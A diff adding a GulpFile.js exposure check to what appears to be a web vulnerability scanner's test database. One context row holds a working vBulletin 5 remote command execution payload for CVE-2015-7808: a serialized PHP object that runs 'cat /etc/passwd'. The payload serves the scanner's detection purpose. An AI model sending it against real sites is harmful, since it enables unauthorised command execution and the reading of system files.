@@ -7001,3 +7001,4 @@
 "007056","0","be","@PIWIKindex.php","GET","<title>.*[Pp]iwik.*</title>","http://piwik.org","200","","","Piwik Analytics login found.","",""
 "007057","0","123b","@PIWIKCHANGELOG.md","GET","## Piwik ([0-9.]+)","","200","","","Piwik Analytics Changelog identified.","",""
 "007058","0","8","@VBULLETINajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A25%3A%22system%28%27cat%20%2Fetc%2Fpasswd%27%29%22%3B%7D","GET","root:0","","","","","vBulletin 5 contains a remote command execution see CVE-2015-7808, http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/.","",""
+"007059","0","3","/GulpFile.js","GET","var\sgulp","","","","","GulpFile.js build config may reveal sensitive information.","",""
